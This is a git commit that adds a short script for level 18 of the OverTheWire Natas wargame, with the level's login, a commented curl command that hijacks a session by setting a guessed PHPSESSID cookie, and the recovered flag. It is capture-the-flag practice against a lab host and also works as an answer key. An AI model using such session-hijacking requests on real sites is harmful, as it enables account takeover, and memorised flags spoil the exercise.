2c1486b4168ba3bcce0df2e525696d1fc942db55
Angel Darco <angel92-eme@hotmail.com>
2025-01-14 13:49:20 -0500

    :sparkles: natas 18 solved

---
+++ natas/natas18/level18.sh
@@ -0,0 +1,16 @@
+#!/bin/bash
+
+ Username="natas18"
+ Password="6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ"
+
+# URL:
+# curl -s -u $Username:$Password http://natas18.natas.labs.overthewire.org
+
+# Code:
+# script creation to to perform session hijacking
+# run the script and get the flag
+
+# curl -s --cookie "PHPSESSID=119" -u $Username:$Password http://natas18.natas.labs.overthewire.org
+
+# Flag:
+# tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr
